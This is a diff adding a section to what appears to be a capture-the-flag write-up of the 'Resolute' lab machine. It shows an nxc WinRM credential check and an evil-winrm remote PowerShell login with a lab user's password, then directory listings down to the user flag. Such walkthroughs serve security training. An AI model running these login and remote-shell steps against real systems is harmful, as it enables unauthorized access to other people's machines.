@@ -270,4 +270,53 @@ All available shares were enumerated, but no interesting files or information we
 
 ---
 ```
+nxc winrm 10.129.100.9 -u melanie -p 'Welcome123!'
+WINRM       10.129.100.9    5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.100.9    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
+
+evil-winrm -i 10.129.100.9 -u melanie -p 'Welcome123!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\melanie\Documents> cd ../
+ls
+*Evil-WinRM* PS C:\Users\melanie> ls
+
+
+    Directory: C:\Users\melanie
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        12/4/2019   2:47 AM                Desktop
+d-r---        12/4/2019   2:46 AM                Documents
+d-r---        7/16/2016   6:18 AM                Downloads
+d-r---        7/16/2016   6:18 AM                Favorites
+d-r---        7/16/2016   6:18 AM                Links
+d-r---        7/16/2016   6:18 AM                Music
+d-r---        7/16/2016   6:18 AM                Pictures
+d-----        7/16/2016   6:18 AM                Saved Games
+d-r---        7/16/2016   6:18 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\melanie> cd Desktop
+ls
+*Evil-WinRM* PS C:\Users\melanie\Desktop> ls
+
+
+    Directory: C:\Users\melanie\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        11/4/2026   5:59 AM             34 user.txt
 ```
+
+Using the credentials `melanie:Welcome123!`, a WinRM session was successfully established, and the user flag was found on the desktop.
